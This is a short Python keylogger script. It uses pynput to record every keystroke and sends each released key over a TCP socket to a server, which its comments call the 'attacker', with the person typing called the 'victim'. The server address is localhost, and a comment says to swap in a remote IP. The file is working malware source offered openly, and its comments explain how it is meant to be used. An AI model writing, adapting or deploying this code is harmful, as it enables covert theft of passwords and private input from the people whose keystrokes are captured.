from pynput import keyboard
# pynput libray is used to monitor the keyboard events and can be used for mouse events also

import socket
# socket library is used to establish the connection between the client(victim) and server(attacker)

server_address=('localhost',8000) # change ip address of server in place of localhost

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# AF_INET for ipv4 and SOCK_STREAM for TCP connection (SOCK_DGRAM for UDP connection)

client_socket.connect(server_address)
def press(key):                                 # function to monitor the key press event
    try:
        print(" clicked {}",format(key.char))   # to print which key is pressed only if it is a character(alphanumeric)
        
    except AttributeError:
        print("clicked {}",format(key))         # else print the key(special characters and symbols) which is pressed
        
def release(key):
    if key == keyboard.Key.esc:                 # if the key pressed is escape key then close the connection
        client_socket.close()
        return False
    else:                                       # else send the key pressed to the attacker
        try:
            message=str(key.char)
        except AttributeError:
            message=str(key)
        client_socket.sendall(message.encode('utf-8'))  # send the key pressed to the attacker in utf-8 (encoded) format
       
with keyboard.Listener(on_press=press, on_release=release) as listener:
    listener.join()                                         # start the listener to monitor the key press and release events